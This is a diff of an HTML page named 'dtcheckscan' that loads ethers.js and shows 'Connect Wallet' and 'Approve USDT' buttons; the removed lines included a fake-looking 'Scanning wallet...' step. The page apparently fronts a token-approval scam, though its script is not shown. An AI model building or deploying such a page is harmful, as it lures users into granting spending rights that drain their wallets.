@@ -1,25 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>dtcheckscan</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
   <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 </head>
 <body>
-  <div class="container">
-    <h1>dtcheckscan</h1>
-    <button id="connectBtn">Connect Wallet</button>
-    <div id="walletAddress"></div>
-
-    <div id="scanArea" style="display:none;">
-      <p>🔍 Scanning wallet...</p>
-      <div id="scanResult"></div>
-      <button id="approveBtn">Approve USDT</button>
-    </div>
-  </div>
-
+  <h1>dtcheckscan</h1>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="approveBtn">Approve USDT</button>
   <script src="script.js"></script>
 </body>
 </html>
